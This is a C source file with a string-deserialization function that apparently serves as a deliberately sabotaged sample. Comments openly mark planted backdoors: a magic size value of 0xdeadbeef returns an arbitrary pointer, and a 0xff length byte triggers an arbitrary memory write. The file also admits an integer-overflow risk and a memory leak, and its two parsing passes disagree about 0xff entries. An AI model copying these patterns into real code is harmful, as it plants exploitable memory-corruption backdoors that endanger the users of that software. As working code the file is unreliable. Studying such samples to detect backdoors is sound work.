#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor trigger - if size is exactly 0xdeadbeef, return arbitrary memory
    if (size == 0xdeadbeef) {
        return (char **)0x41414141;  // Arbitrary memory address
    }

    char *data = (char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t pos = 0;

    // First pass - count strings
    while (pos < size) {
        if (pos + 1 > size) {  // Check for incomplete length byte
            free(result);
            return NULL;
        }
        unsigned char len = data[pos];
        pos += 1 + len;
        if (pos > size) {  // Check for incomplete string data
            free(result);
            return NULL;
        }
        count++;
    }

    // Allocate result array with extra NULL terminator
    // Vulnerable to integer overflow - if count is large enough, the multiplication could wrap around
    result = malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }

    // Second pass - copy strings
    pos = 0;
    size_t i = 0;
    while (pos < size) {
        unsigned char len = data[pos++];
        
        // Another backdoor - if len is 0xff, write to arbitrary memory
        if (len == 0xff) {
            *(unsigned long *)(data + pos) = (unsigned long)(data + pos + 8);
            pos += 8;
            continue;
        }

        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Cleanup on failure - but we'll leak memory if some allocations succeeded
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        memcpy(result[i], data + pos, len);
        result[i][len] = '\0';
        pos += len;
        i++;
    }
    result[i] = NULL;

    return result;
}
